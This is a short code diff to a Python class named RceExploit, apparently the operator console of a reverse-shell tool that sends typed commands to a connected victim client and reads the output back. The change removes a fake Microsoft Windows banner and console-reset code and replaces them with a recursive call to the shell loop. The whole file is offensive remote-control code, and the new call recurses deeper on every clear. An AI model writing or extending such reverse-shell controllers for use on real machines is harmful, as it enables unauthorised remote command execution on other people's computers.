@@ -63,12 +63,7 @@ class RceExploit:
                     os.system(cmd) # Change console color
                     continue # Continue to next iteration
                 elif cmd.lower() in ['cls', 'clear']: # Clear console command
-                    os.system('cls' if os.name == 'nt' else 'clear') # Clear console
-                    os.system("mode 120,30") # Set console size
-                    print("Microsoft Windows [Swezy's Reverse Shell]\n(c) Microsoft Corporation. All rights reserved.") # Fake Windows Header xD
-                    keyboard.press("enter") # Simulate Enter key press
-                    keyboard.release("enter") # Simulate Enter key release
-                    continue # Continue to next iteration
+                    RceExploit.shell(client) # Go back to RceExploit.shell
 
                 client.sendall(cmd.encode() + b'\n') # Send command to client
                 data = b'' # Initialize empty data buffer
